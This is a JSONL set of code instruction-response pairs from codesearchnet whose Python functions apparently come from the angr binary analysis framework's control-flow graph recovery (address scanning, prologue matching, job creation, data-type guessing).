{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ngets the minimum address out of all regions.", "response": "def _get_min_addr(self):\n        \"\"\"\n        Get the minimum address out of all regions. We assume self._regions is sorted.\n\n        :return: The minimum address.\n        :rtype:  int\n        \"\"\"\n\n        if not self._regions:\n            if self.project.arch.name != \"Soot\":\n                l.error(\"self._regions is empty or not properly set.\")\n            return None\n\n        return next(self._regions.irange())"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nreturns the next immediate address that is inside one of the memory regions.", "response": "def _next_address_in_regions(self, address):\n        \"\"\"\n        Return the next immediate address that is inside any of the regions.\n\n        :param int address: The address to start scanning.\n        :return:            The next address that is inside one of the memory regions.\n        :rtype:             int\n        \"\"\"\n\n        if self._inside_regions(address):\n            return address\n\n        try:\n            return next(self._regions.irange(minimum=address, reverse=False))\n        except StopIteration:\n            return None"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _next_unscanned_addr(self, alignment=None):\n\n        # TODO: Take care of those functions that are already generated\n        if self._next_addr is None:\n            self._next_addr = self._get_min_addr()\n            curr_addr = self._next_addr\n        else:\n            curr_addr = self._next_addr + 1\n\n        if not self._inside_regions(curr_addr):\n            curr_addr = self._next_address_in_regions(curr_addr)\n\n        if curr_addr is None:\n            l.debug(\"All addresses within memory regions have been scanned.\")\n            return None\n\n        if self._seg_list.has_blocks:\n            curr_addr = self._seg_list.next_free_pos(curr_addr)\n\n        if alignment is not None:\n            if curr_addr % alignment > 0:\n                curr_addr = curr_addr - (curr_addr % alignment) + alignment\n\n        # Make sure curr_addr exists in binary\n        accepted = False\n        for start, end in self._regions.items():\n            if start <= curr_addr < end:\n                # accept\n                accepted = True\n                break\n            if curr_addr < start:\n                # accept, but we are skipping the gap\n                accepted = True\n                curr_addr = start\n                break\n\n        if not accepted:\n            # No memory available!\n            return None\n\n        self._next_addr = curr_addr\n        if self._inside_regions(curr_addr):\n            l.debug(\"Returning a new recon address: %#x\", curr_addr)\n            return curr_addr\n\n        l.debug(\"%#x is beyond the ending point. Returning None.\", curr_addr)\n        return None", "response": "Find the next unscanned address in the memory."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nreturning the next code address in the core segment.", "response": "def _next_code_addr_core(self):\n        \"\"\"\n        Call _next_unscanned_addr() first to get the next address that is not scanned. Then check if data locates at\n        that address seems to be code or not. If not, we'll continue to for the next un-scanned address.\n        \"\"\"\n\n        next_addr = self._next_unscanned_addr()\n        if next_addr is None:\n            return None\n\n        start_addr = next_addr\n\n        while True:\n            string_length = self._scan_for_printable_strings(start_addr)\n            if string_length:\n                self._seg_list.occupy(start_addr, string_length, \"string\")\n                start_addr += string_length\n\n            if self.project.arch.name in ('X86', 'AMD64'):\n                cc_length = self._scan_for_repeating_bytes(start_addr, '\\xcc')\n                if cc_length:\n                    self._seg_list.occupy(start_addr, cc_length, \"alignment\")\n                    start_addr += cc_length\n            else:\n                cc_length = 0\n\n            zeros_length = self._scan_for_repeating_bytes(start_addr, '\\x00')\n            if zeros_length:\n                self._seg_list.occupy(start_addr, zeros_length, \"alignment\")\n                start_addr += zeros_length\n\n            if string_length == 0 and cc_length == 0 and zeros_length == 0:\n                # umm now it's probably code\n                break\n\n        instr_alignment = self._initial_state.arch.instruction_alignment\n        if start_addr % instr_alignment > 0:\n            # occupy those few bytes\n            self._seg_list.occupy(start_addr, instr_alignment - (start_addr % instr_alignment), 'alignment')\n            start_addr = start_addr - start_addr % instr_alignment + \\\n                         instr_alignment\n\n        return start_addr"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ngetting all possible function addresses that are specified by the symbols in the binary", "response": "def _func_addrs_from_symbols(self):\n        \"\"\"\n        Get all possible function addresses that are specified by the symbols in the binary\n\n        :return: A set of addresses that are probably functions\n        :rtype: set\n        \"\"\"\n\n        return {sym.rebased_addr for sym in self._binary.symbols if sym.is_function}"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _func_addrs_from_prologues(self):\n\n        # Pre-compile all regexes\n        regexes = list()\n        for ins_regex in self.project.arch.function_prologs:\n            r = re.compile(ins_regex)\n            regexes.append(r)\n        # EDG says: I challenge anyone bothering to read this to come up with a better\n        # way to handle CPU modes that affect instruction decoding.\n        # Since the only one we care about is ARM/Thumb right now\n        # we have this gross hack. Sorry about that.\n        thumb_regexes = list()\n        if hasattr(self.project.arch, 'thumb_prologs'):\n            for ins_regex in self.project.arch.thumb_prologs:\n                # Thumb prologues are found at even addrs, but their actual addr is odd!\n                # Isn't that great?\n                r = re.compile(ins_regex)\n                thumb_regexes.append(r)\n\n        # Construct the binary blob first\n        unassured_functions = [ ]\n\n        for start_, bytes_ in self._binary.memory.backers():\n            for regex in regexes:\n                # Match them!\n                for mo in regex.finditer(bytes_):\n                    position = mo.start() + start_\n                    if position % self.project.arch.instruction_alignment == 0:\n                        mapped_position = AT.from_rva(position, self._binary).to_mva()\n                        if self._addr_in_exec_memory_regions(mapped_position):\n                            unassured_functions.append(mapped_position)\n            # HACK part 2: Yes, i really have to do this\n            for regex in thumb_regexes:\n                # Match them!\n                for mo in regex.finditer(bytes_):\n                    position = mo.start() + start_\n                    if position % self.project.arch.instruction_alignment == 0:\n                        mapped_position = AT.from_rva(position, self._binary).to_mva()\n                        if self._addr_in_exec_memory_regions(mapped_position):\n                            unassured_functions.append(mapped_position+1)\n\n        l.info(\"Found %d functions with prologue scanning.\", len(unassured_functions))\n        return unassured_functions", "response": "Scan the entire program image for function prologues and start code scanning at those positions and return a list of possible function addresses."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nscanning a basic block starting at a specific address.", "response": "def _scan_block(self, cfg_job):\n        \"\"\"\n        Scan a basic block starting at a specific address\n\n        :param CFGJob cfg_job: The CFGJob instance.\n        :return: a list of successors\n        :rtype: list\n        \"\"\"\n\n        addr = cfg_job.addr\n        current_func_addr = cfg_job.func_addr\n\n        # Fix the function address\n        # This is for rare cases where we cannot successfully determine the end boundary of a previous function, and\n        # as a consequence, our analysis mistakenly thinks the previous function goes all the way across the boundary,\n        # resulting the missing of the second function in function manager.\n        if addr in self._function_addresses_from_symbols:\n            current_func_addr = addr\n\n        if self._addr_hooked_or_syscall(addr):\n            entries = self._scan_procedure(cfg_job, current_func_addr)\n\n        else:\n            entries = self._scan_irsb(cfg_job, current_func_addr)\n\n        return entries"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _scan_procedure(self, cfg_job, current_func_addr):\n\n        addr = cfg_job.addr\n\n        try:\n            if self.project.is_hooked(addr):\n                procedure = self.project.hooked_by(addr)\n                name = procedure.display_name\n            else:\n                procedure = self.project.simos.syscall_from_addr(addr)\n                name = procedure.display_name\n\n            if addr not in self._nodes:\n                cfg_node = CFGNode(addr, 0, self.model,\n                                   function_address=current_func_addr,\n                                   simprocedure_name=name,\n                                   no_ret=procedure.NO_RET,\n                                   block_id=addr,\n                                   )\n\n                self._nodes[addr] = cfg_node\n                self._nodes_by_addr[addr].append(cfg_node)\n\n            else:\n                cfg_node = self._nodes[addr]\n\n        except (SimMemoryError, SimEngineError):\n            return [ ]\n\n        self._graph_add_edge(cfg_node, cfg_job.src_node, cfg_job.jumpkind, cfg_job.src_ins_addr,\n                             cfg_job.src_stmt_idx\n                             )\n        self._function_add_node(cfg_node, current_func_addr)\n\n        # Add edges going to this node in function graphs\n        cfg_job.apply_function_edges(self, clear=True)\n\n        # If we have traced it before, don't trace it anymore\n        if addr in self._traced_addresses:\n            return [ ]\n        else:\n            # Mark the address as traced\n            self._traced_addresses.add(addr)\n\n        entries = [ ]\n\n        if procedure.ADDS_EXITS:\n            # Get two blocks ahead\n            grandparent_nodes = list(self.graph.predecessors(cfg_job.src_node))\n            if not grandparent_nodes:\n                l.warning(\"%s is supposed to yield new exits, but it fails to do so.\", name)\n                return [ ]\n            blocks_ahead = [\n                self._lift(grandparent_nodes[0].addr).vex,\n                self._lift(cfg_job.src_node.addr).vex,\n            ]\n            procedure.project = self.project\n            procedure.arch = self.project.arch\n            new_exits = procedure.static_exits(blocks_ahead)\n\n            for addr_, jumpkind in new_exits:\n                if isinstance(addr_, claripy.ast.BV) and not addr_.symbolic:\n                    addr_ = addr_._model_concrete.value\n                if not isinstance(addr_, int):\n                    continue\n                entries += self._create_jobs(addr_, jumpkind, current_func_addr, None, addr_, cfg_node, None,\n                                             None\n                                             )\n\n        if not procedure.NO_RET:\n            # it returns\n            cfg_node.has_return = True\n            self._function_exits[current_func_addr].add(addr)\n            self._function_add_return_site(addr, current_func_addr)\n        else:\n            # the procedure does not return\n            self._updated_nonreturning_functions.add(current_func_addr)\n\n        return entries", "response": "Scan a CFGJob for a specific address and add the relevant exit points to the successors list."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _scan_irsb(self, cfg_job, current_func_addr):\n        addr, function_addr, cfg_node, irsb = self._generate_cfgnode(cfg_job, current_func_addr)\n\n        # Add edges going to this node in function graphs\n        cfg_job.apply_function_edges(self, clear=True)\n\n        # function_addr and current_function_addr can be different. e.g. when tracing an optimized tail-call that jumps\n        # into another function that has been identified before.\n\n        if cfg_node is None:\n            # exceptions occurred, or we cannot get a CFGNode for other reasons\n            return [ ]\n\n        self._graph_add_edge(cfg_node, cfg_job.src_node, cfg_job.jumpkind, cfg_job.src_ins_addr,\n                             cfg_job.src_stmt_idx\n                             )\n        self._function_add_node(cfg_node, function_addr)\n\n        if self.functions.get_by_addr(function_addr).returning is not True:\n            self._updated_nonreturning_functions.add(function_addr)\n\n        # If we have traced it before, don't trace it anymore\n        real_addr = get_real_address_if_arm(self.project.arch, addr)\n        if real_addr in self._traced_addresses:\n            # the address has been traced before\n            return [ ]\n        else:\n            # Mark the address as traced\n            self._traced_addresses.add(real_addr)\n\n        # irsb cannot be None here\n        # assert irsb is not None\n\n        # IRSB is only used once per CFGNode. We should be able to clean up the CFGNode here in order to save memory\n        cfg_node.irsb = None\n\n        self._process_block_arch_specific(addr, irsb, function_addr)\n\n        # Scan the basic block to collect data references\n        if self._collect_data_ref:\n            self._collect_data_references(irsb, addr)\n\n        # Get all possible successors\n        irsb_next, jumpkind = irsb.next, irsb.jumpkind\n        successors = [ ]\n\n        last_ins_addr = None\n        ins_addr = addr\n        if irsb.statements:\n            for i, stmt in enumerate(irsb.statements):\n                if isinstance(stmt, pyvex.IRStmt.Exit):\n                    successors.append((i,\n                                       last_ins_addr if self.project.arch.branch_delay_slot else ins_addr,\n                                       stmt.dst,\n                                       stmt.jumpkind\n                                       )\n                                      )\n                elif isinstance(stmt, pyvex.IRStmt.IMark):\n                    last_ins_addr = ins_addr\n                    ins_addr = stmt.addr + stmt.delta\n        else:\n            for ins_addr, stmt_idx, exit_stmt in irsb.exit_statements:\n                successors.append((\n                    stmt_idx,\n                    last_ins_addr if self.project.arch.branch_delay_slot else ins_addr,\n                    exit_stmt.dst,\n                    exit_stmt.jumpkind\n                ))\n\n        successors.append((DEFAULT_STATEMENT,\n                           last_ins_addr if self.project.arch.branch_delay_slot else ins_addr, irsb_next, jumpkind)\n                          )\n\n        entries = [ ]\n\n        successors = self._post_process_successors(addr, irsb.size, successors)\n\n        # Process each successor\n        for suc in successors:\n            stmt_idx, ins_addr, target, jumpkind = suc\n\n            entries += self._create_jobs(target, jumpkind, function_addr, irsb, addr, cfg_node, ins_addr,\n                                         stmt_idx\n                                         )\n\n        return entries", "response": "Scan the IRSB for the given CFGJob and return a list of successors."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ncreating a list of CFGJobs that are needed to create the CFGJobs for the current CFGEntry.", "response": "def _create_jobs(self, target, jumpkind, current_function_addr, irsb, addr, cfg_node, ins_addr, stmt_idx):\n        \"\"\"\n        Given a node and details of a successor, makes a list of CFGJobs\n        and if it is a call or exit marks it appropriately so in the CFG\n\n        :param int target:          Destination of the resultant job\n        :param str jumpkind:        The jumpkind of the edge going to this node\n        :param int current_function_addr: Address of the current function\n        :param pyvex.IRSB irsb:     IRSB of the predecessor node\n        :param int addr:            The predecessor address\n        :param CFGNode cfg_node:    The CFGNode of the predecessor node\n        :param int ins_addr:        Address of the source instruction.\n        :param int stmt_idx:        ID of the source statement.\n        :return:                    a list of CFGJobs\n        :rtype:                     list\n        \"\"\"\n\n        if type(target) is pyvex.IRExpr.Const:  # pylint: disable=unidiomatic-typecheck\n            target_addr = target.con.value\n        elif type(target) in (pyvex.IRConst.U8, pyvex.IRConst.U16, pyvex.IRConst.U32, pyvex.IRConst.U64):  # pylint: disable=unidiomatic-typecheck\n            target_addr = target.value\n        elif type(target) is int:  # pylint: disable=unidiomatic-typecheck\n            target_addr = target\n        else:\n            target_addr = None\n\n        if target_addr in self._known_thunks and jumpkind == 'Ijk_Boring':\n            thunk_kind = self._known_thunks[target_addr][0]\n            if thunk_kind == 'ret':\n                jumpkind = 'Ijk_Ret'\n                target_addr = None\n            elif thunk_kind == 'jmp':\n                pass # ummmmmm not sure about this one\n            else:\n                raise AngrCFGError(\"This shouldn't be possible\")\n\n        jobs = [ ]\n        is_syscall = jumpkind.startswith(\"Ijk_Sys\")\n\n        # Special handling:\n        # If a call instruction has a target that points to the immediate next instruction, we treat it as a boring jump\n        if jumpkind == \"Ijk_Call\" and \\\n                not self.project.arch.call_pushes_ret and \\\n                cfg_node.instruction_addrs and \\\n                ins_addr == cfg_node.instruction_addrs[-1] and \\\n                target_addr == irsb.addr + irsb.size:\n            jumpkind = \"Ijk_Boring\"\n\n        if target_addr is None:\n            # The target address is not a concrete value\n\n            if jumpkind == \"Ijk_Ret\":\n                # This block ends with a return instruction.\n                if current_function_addr != -1:\n                    self._function_exits[current_function_addr].add(addr)\n                    self._function_add_return_site(addr, current_function_addr)\n                    self.functions[current_function_addr].returning = True\n                    self._pending_jobs.add_returning_function(current_function_addr)\n\n                cfg_node.has_return = True\n\n            elif self._resolve_indirect_jumps and \\\n                    (jumpkind in ('Ijk_Boring', 'Ijk_Call', 'Ijk_InvalICache') or jumpkind.startswith('Ijk_Sys')):\n                # This is an indirect jump. Try to resolve it.\n                # FIXME: in some cases, a statementless irsb will be missing its instr addresses\n                # and this next part will fail. Use the real IRSB instead\n                irsb = cfg_node.block.vex\n                cfg_node.instruction_addrs = irsb.instruction_addresses\n                resolved, resolved_targets, ij = self._indirect_jump_encountered(addr, cfg_node, irsb,\n                                                                                 current_function_addr, stmt_idx)\n                if resolved:\n                    for resolved_target in resolved_targets:\n                        if jumpkind == 'Ijk_Call':\n                            jobs += self._create_job_call(cfg_node.addr, irsb, cfg_node, stmt_idx, ins_addr,\n                                                          current_function_addr, resolved_target, jumpkind)\n                        else:\n                            edge = FunctionTransitionEdge(cfg_node, resolved_target, current_function_addr,\n                                                          to_outside=False, stmt_idx=stmt_idx, ins_addr=ins_addr,\n                                                          )\n                            ce = CFGJob(resolved_target, current_function_addr, jumpkind,\n                                        last_addr=resolved_target, src_node=cfg_node, src_stmt_idx=stmt_idx,\n                                        src_ins_addr=ins_addr, func_edges=[ edge ],\n                                        )\n                            jobs.append(ce)\n                    return jobs\n\n                if jumpkind in (\"Ijk_Boring\", 'Ijk_InvalICache'):\n                    resolved_as_plt = False\n\n                    if irsb and self._heuristic_plt_resolving:\n                        # Test it on the initial state. Does it jump to a valid location?\n                        # It will be resolved only if this is a .plt entry\n                        resolved_as_plt = self._resolve_plt(addr, irsb, ij)\n\n                        if resolved_as_plt:\n                            jump_target = next(iter(ij.resolved_targets))\n                            target_func_addr = jump_target  # TODO: FIX THIS\n\n                            edge = FunctionTransitionEdge(cfg_node, jump_target, current_function_addr,\n                                                          to_outside=True, dst_func_addr=jump_target,\n                                                          stmt_idx=stmt_idx, ins_addr=ins_addr,\n                                                          )\n                            ce = CFGJob(jump_target, target_func_addr, jumpkind, last_addr=jump_target,\n                                        src_node=cfg_node, src_stmt_idx=stmt_idx, src_ins_addr=ins_addr,\n                                        func_edges=[edge],\n                                        )\n                            jobs.append(ce)\n\n                    if resolved_as_plt:\n                        # has been resolved as a PLT entry. Remove it from indirect_jumps_to_resolve\n                        if ij.addr in self._indirect_jumps_to_resolve:\n                            self._indirect_jumps_to_resolve.remove(ij.addr)\n                            self._deregister_analysis_job(current_function_addr, ij)\n                    else:\n                        # add it to indirect_jumps_to_resolve\n                        self._indirect_jumps_to_resolve.add(ij)\n\n                        # register it as a job for the current function\n                        self._register_analysis_job(current_function_addr, ij)\n\n                else:  # jumpkind == \"Ijk_Call\" or jumpkind.startswith('Ijk_Sys')\n                    self._indirect_jumps_to_resolve.add(ij)\n                    self._register_analysis_job(current_function_addr, ij)\n\n                    jobs += self._create_job_call(addr, irsb, cfg_node, stmt_idx, ins_addr, current_function_addr, None,\n                                                  jumpkind, is_syscall=is_syscall\n                                                  )\n\n        elif target_addr is not None:\n            # This is a direct jump with a concrete target.\n\n            # pylint: disable=too-many-nested-blocks\n            if jumpkind in ('Ijk_Boring', 'Ijk_InvalICache'):\n                # if the target address is at another section, it has to be jumping to a new function\n                if not self._addrs_belong_to_same_section(addr, target_addr):\n                    target_func_addr = target_addr\n                    to_outside = True\n                else:\n                    # it might be a jumpout\n                    target_func_addr = None\n                    real_target_addr = get_real_address_if_arm(self.project.arch, target_addr)\n                    if real_target_addr in self._traced_addresses:\n                        node = self.model.get_any_node(target_addr)\n                        if node is not None:\n                            target_func_addr = node.function_address\n                    if target_func_addr is None:\n                        target_func_addr = current_function_addr\n\n                    to_outside = not target_func_addr == current_function_addr\n\n                edge = FunctionTransitionEdge(cfg_node, target_addr, current_function_addr,\n                                              to_outside=to_outside,\n                                              dst_func_addr=target_func_addr,\n                                              ins_addr=ins_addr,\n                                              stmt_idx=stmt_idx,\n                                              )\n\n                ce = CFGJob(target_addr, target_func_addr, jumpkind, last_addr=addr, src_node=cfg_node,\n                            src_ins_addr=ins_addr, src_stmt_idx=stmt_idx, func_edges=[ edge ])\n                jobs.append(ce)\n\n            elif jumpkind == 'Ijk_Call' or jumpkind.startswith(\"Ijk_Sys\"):\n                jobs += self._create_job_call(addr, irsb, cfg_node, stmt_idx, ins_addr, current_function_addr,\n                                              target_addr, jumpkind, is_syscall=is_syscall\n                                              )\n\n            else:\n                # TODO: Support more jumpkinds\n                l.debug(\"Unsupported jumpkind %s\", jumpkind)\n                l.debug(\"Instruction address: %#x\", ins_addr)\n\n        return jobs"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ngenerates a CFGJob for a given target address.", "response": "def _create_job_call(self, addr, irsb, cfg_node, stmt_idx, ins_addr, current_function_addr, target_addr, jumpkind,\n                         is_syscall=False):\n        \"\"\"\n        Generate a CFGJob for target address, also adding to _pending_entries\n        if returning to succeeding position (if irsb arg is populated)\n\n        :param int addr:            Address of the predecessor node\n        :param pyvex.IRSB irsb:     IRSB of the predecessor node\n        :param CFGNode cfg_node:    The CFGNode instance of the predecessor node\n        :param int stmt_idx:        ID of the source statement\n        :param int ins_addr:        Address of the source instruction\n        :param int current_function_addr: Address of the current function\n        :param int target_addr:     Destination of the call\n        :param str jumpkind:        The jumpkind of the edge going to this node\n        :param bool is_syscall:     Is the jump kind (and thus this) a system call\n        :return:                    A list of CFGJobs\n        :rtype:                     list\n        \"\"\"\n\n        jobs = [ ]\n\n        if is_syscall:\n            # Fix the target_addr for syscalls\n            tmp_state = self.project.factory.blank_state(mode=\"fastpath\", addr=cfg_node.addr)\n            # Find the first successor with a syscall jumpkind\n            succ = next(iter(succ for succ in self.project.factory.successors(tmp_state).flat_successors\n                             if succ.history.jumpkind and succ.history.jumpkind.startswith(\"Ijk_Sys\")), None)\n            if succ is None:\n                # For some reason, there is no such successor with a syscall jumpkind\n                target_addr = self._unresolvable_call_target_addr\n            else:\n                try:\n                    syscall_stub = self.project.simos.syscall(succ)\n                    if syscall_stub:  # can be None if simos is not a subclass of SimUserspac\n                        syscall_addr = syscall_stub.addr\n                        target_addr = syscall_addr\n                    else:\n                        target_addr = self._unresolvable_call_target_addr\n                except AngrUnsupportedSyscallError:\n                    target_addr = self._unresolvable_call_target_addr\n\n        if isinstance(target_addr, SootAddressDescriptor):\n            new_function_addr = target_addr.method\n        else:\n            new_function_addr = target_addr\n\n        if irsb is None:\n            return_site = None\n        else:\n            if self.project.arch.name != 'Soot':\n                return_site = addr + irsb.size  # We assume the program will always return to the succeeding position\n            else:\n                # For Soot, we return to the next statement, which is not necessarily the next block (as Shimple does\n                # not break blocks at calls)\n                assert isinstance(ins_addr, SootAddressDescriptor)\n                soot_block = irsb\n                return_block_idx = ins_addr.block_idx\n                if stmt_idx + 1 >= soot_block.label + len(soot_block.statements):\n                    # tick the block ID\n                    return_block_idx += 1\n                return_site = SootAddressDescriptor(ins_addr.method, return_block_idx, stmt_idx + 1)\n\n        edge = None\n        if new_function_addr is not None:\n            edge = FunctionCallEdge(cfg_node, new_function_addr, return_site, current_function_addr, syscall=is_syscall,\n                                    ins_addr=ins_addr, stmt_idx=ins_addr,\n                                    )\n\n        if new_function_addr is not None:\n            # Keep tracing from the call\n            ce = CFGJob(target_addr, new_function_addr, jumpkind, last_addr=addr, src_node=cfg_node,\n                        src_stmt_idx=stmt_idx, src_ins_addr=ins_addr, syscall=is_syscall, func_edges=[ edge ]\n                        )\n            jobs.append(ce)\n\n        callee_might_return = True\n        callee_function = None\n\n        if new_function_addr is not None:\n            if is_syscall:\n                # we can create the syscall function if it does not exist yet. it has to be handled as a SimProcedure\n                # anyway\n                callee_function = self.kb.functions.function(addr=new_function_addr, syscall=is_syscall, create=True)\n            else:\n                callee_function = self.kb.functions.function(addr=new_function_addr, syscall=is_syscall)\n            if callee_function is not None:\n                callee_might_return = not (callee_function.returning is False)\n\n        if callee_might_return:\n            func_edges = [ ]\n            if return_site is not None:\n                if callee_function is not None and callee_function.returning is True:\n                    fakeret_edge = FunctionFakeRetEdge(cfg_node, return_site, current_function_addr, confirmed=True)\n                    func_edges.append(fakeret_edge)\n                    ret_edge = FunctionReturnEdge(new_function_addr, return_site, current_function_addr)\n                    func_edges.append(ret_edge)\n\n                    # Also, keep tracing from the return site\n                    ce = CFGJob(return_site, current_function_addr, 'Ijk_FakeRet', last_addr=addr, src_node=cfg_node,\n                                src_stmt_idx=stmt_idx, src_ins_addr=ins_addr, returning_source=new_function_addr,\n                                syscall=is_syscall, func_edges=func_edges)\n                    self._pending_jobs.add_job(ce)\n                    # register this job to this function\n                    self._register_analysis_job(current_function_addr, ce)\n                elif callee_function is not None and callee_function.returning is False:\n                    pass # Don't go past a call that does not return!\n                else:\n                    # HACK: We don't know where we are jumping.  Let's assume we fakeret to the\n                    # next instruction after the block\n                    # TODO: FIXME: There are arch-specific hints to give the correct ret site\n                    # Such as looking for constant values of LR in this block for ARM stuff.\n                    fakeret_edge = FunctionFakeRetEdge(cfg_node, return_site, current_function_addr, confirmed=None)\n                    func_edges.append(fakeret_edge)\n                    fr = FunctionReturn(new_function_addr, current_function_addr, addr, return_site)\n                    if fr not in self._function_returns[new_function_addr]:\n                        self._function_returns[new_function_addr].add(fr)\n                    ce = CFGJob(return_site, current_function_addr, 'Ijk_FakeRet', last_addr=addr, src_node=cfg_node,\n                                src_stmt_idx=stmt_idx, src_ins_addr=ins_addr, returning_source=new_function_addr,\n                                syscall=is_syscall, func_edges=func_edges)\n                    self._pending_jobs.add_job(ce)\n                    # register this job to this function\n                    self._register_analysis_job(current_function_addr, ce)\n\n\n        return jobs"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ncollects all data references for the given IRSB and add them to the internal list of data references.", "response": "def _collect_data_references(self, irsb, irsb_addr):\n        \"\"\"\n        Unoptimises IRSB and _add_data_reference's for individual statements or\n        for parts of statements (e.g. Store)\n\n        :param pyvex.IRSB irsb: Block to scan for data references\n        :param int irsb_addr: Address of block\n        :return: None\n        \"\"\"\n\n        if irsb.data_refs:\n            self._process_irsb_data_refs(irsb)\n        elif irsb.statements:\n            irsb = self._unoptimize_irsb(irsb)\n            # for each statement, collect all constants that are referenced or used.\n            self._collect_data_references_by_scanning_stmts(irsb, irsb_addr)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nadding a data reference to the memory of the current object.", "response": "def _add_data_reference(self, irsb_addr, stmt_idx, insn_addr, data_addr,  # pylint: disable=unused-argument\n                            data_size=None, data_type=None):\n        \"\"\"\n        Checks addresses are in the correct segments and creates or updates\n        MemoryData in _memory_data as appropriate, labelling as segment\n        boundaries or data type\n\n        :param int irsb_addr: irsb address\n        :param int stmt_idx: Statement ID\n        :param int insn_addr: instruction address\n        :param data_addr: address of data manipulated by statement\n        :param data_size: Size of the data being manipulated\n        :param str data_type: Type of the data being manipulated\n        :return: None\n        \"\"\"\n\n        # Make sure data_addr is within a valid memory range\n        if not self.project.loader.find_segment_containing(data_addr):\n\n            # data might be at the end of some section or segment...\n            # let's take a look\n            for segment in self.project.loader.main_object.segments:\n                if segment.vaddr + segment.memsize == data_addr:\n                    # yeah!\n                    new_data = False\n                    if data_addr not in self._memory_data:\n                        data = MemoryData(data_addr, 0, MemoryDataSort.SegmentBoundary)\n                        self._memory_data[data_addr] = data\n                        new_data = True\n\n                    if new_data or self._extra_cross_references:\n                        cr = CodeReference(insn_addr, irsb_addr, stmt_idx, memory_data=self.model.memory_data[data_addr])\n                        self.model.references.add_ref(cr)\n                    break\n\n            return\n\n        new_data = False\n        if data_addr not in self._memory_data:\n            if data_type is not None and data_size is not None:\n                data = MemoryData(data_addr, data_size, data_type, max_size=data_size)\n            else:\n                data = MemoryData(data_addr, 0, MemoryDataSort.Unknown)\n            self._memory_data[data_addr] = data\n            new_data = True\n        if new_data or self._extra_cross_references:\n            cr = CodeReference(insn_addr, irsb_addr, stmt_idx, memory_data=self.model.memory_data[data_addr])\n            self.model.references.add_ref(cr)\n\n        self.insn_addr_to_memory_data[insn_addr] = self._memory_data[data_addr]"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _guess_data_type(self, data_addr, max_size, content_holder=None):\n\n        try:\n            ref = next(iter(self.model.references.data_addr_to_ref[data_addr]))  # type: CodeReference\n            irsb_addr = ref.block_addr\n            stmt_idx = ref.stmt_idx\n        except StopIteration:\n            irsb_addr, stmt_idx = None, None\n\n        if max_size is None:\n            max_size = 0\n\n        if self._seg_list.is_occupied(data_addr) and self._seg_list.occupied_by_sort(data_addr) == 'code':\n            # it's a code reference\n            # TODO: Further check if it's the beginning of an instruction\n            return MemoryDataSort.CodeReference, 0\n\n        pointer_size = self.project.arch.bytes\n\n        # who's using it?\n        if isinstance(self.project.loader.main_object, cle.MetaELF):\n            plt_entry = self.project.loader.main_object.reverse_plt.get(irsb_addr, None)\n            if plt_entry is not None:\n                # IRSB is owned by plt!\n                return MemoryDataSort.GOTPLTEntry, pointer_size\n\n        # is it in a section with zero bytes, like .bss?\n        obj = self.project.loader.find_object_containing(data_addr)\n        section = obj.find_section_containing(data_addr)\n        if section is not None and section.only_contains_uninitialized_data:\n            # Nothing much you can do\n            return None, None\n\n        pointers_count = 0\n\n        max_pointer_array_size = min(512 * pointer_size, max_size)\n        for i in range(0, max_pointer_array_size, pointer_size):\n            ptr = self._fast_memory_load_pointer(data_addr + i)\n\n            if ptr is not None:\n                #if self._seg_list.is_occupied(ptr) and self._seg_list.occupied_by_sort(ptr) == 'code':\n                #    # it's a code reference\n                #    # TODO: Further check if it's the beginning of an instruction\n                #    pass\n                if self.project.loader.find_section_containing(ptr) is not None or \\\n                        self.project.loader.find_segment_containing(ptr) is not None or \\\n                        (self._extra_memory_regions and\n                         next(((a < ptr < b) for (a, b) in self._extra_memory_regions), None)\n                         ):\n                    # it's a pointer of some sort\n                    # TODO: Determine what sort of pointer it is\n                    pointers_count += 1\n                else:\n                    break\n\n        if pointers_count:\n            return MemoryDataSort.PointerArray, pointer_size * pointers_count\n\n        try:\n            data = self.project.loader.memory.load(data_addr, 1024)\n        except KeyError:\n            data = b''\n\n        # Is it an unicode string?\n        # TODO: Support unicode string longer than the max length\n        if len(data) >= 4 and data[1] == 0 and data[3] == 0 and data[0] in self.PRINTABLES:\n            def can_decode(n):\n                try:\n                    data[:n*2].decode('utf_16_le')\n                except UnicodeDecodeError:\n                    return False\n                return True\n            if can_decode(4) or can_decode(5) or can_decode(6):\n                running_failures = 0\n                last_success = 4\n                for i in range(4, len(data) // 2):\n                    if can_decode(i):\n                        last_success = i\n                        running_failures = 0\n                        if data[i*2-2] == 0 and data[i*2-1] == 0:\n                            break\n                    else:\n                        running_failures += 1\n                        if running_failures > 3:\n                            break\n\n                return MemoryDataSort.UnicodeString, last_success\n\n        if data:\n            try:\n                zero_pos = data.index(0)\n            except ValueError:\n                zero_pos = None\n            if (zero_pos is not None and zero_pos > 0 and all(c in self.PRINTABLES for c in data[:zero_pos])) or \\\n                    all(c in self.PRINTABLES for c in data):\n                # it's a string\n                # however, it may not be terminated\n                string_data = data if zero_pos is None else data[:zero_pos]\n                if content_holder is not None:\n                    content_holder.append(string_data)\n                return MemoryDataSort.String, min(len(string_data) + 1, 1024)\n\n        for handler in self._data_type_guessing_handlers:\n            irsb = None if irsb_addr is None else self.model.get_any_node(irsb_addr).block.vex\n            sort, size = handler(self, irsb, irsb_addr, stmt_idx, data_addr, max_size)\n            if sort is not None:\n                return sort, size\n\n        return None, None", "response": "Guesses the data type of the data entry."}
